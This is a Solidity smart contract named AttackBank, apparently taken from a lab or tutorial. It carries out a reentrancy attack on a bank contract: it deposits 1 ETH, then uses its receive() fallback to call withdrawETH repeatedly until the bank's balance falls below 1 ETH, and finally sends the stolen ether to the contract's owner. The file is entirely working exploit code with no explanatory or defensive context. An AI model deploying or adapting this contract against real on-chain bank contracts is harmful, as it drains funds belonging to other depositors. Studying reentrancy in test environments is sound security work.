// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IBank {
    function depositETH() external payable;

    function withdrawETH() external;
}

contract AttackBank {
    IBank bank;
    address payable owner;

    constructor(address _bankAddress) {
        bank = IBank(_bankAddress);
        owner = payable(msg.sender);
    }

    function attack() external payable {
        bank.depositETH{value: 1 ether}();
        bank.withdrawETH();
    }

    receive() external payable {
        // 1 ETH
        if (address(bank).balance >= 1 ether) {
            bank.withdrawETH();
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }
}
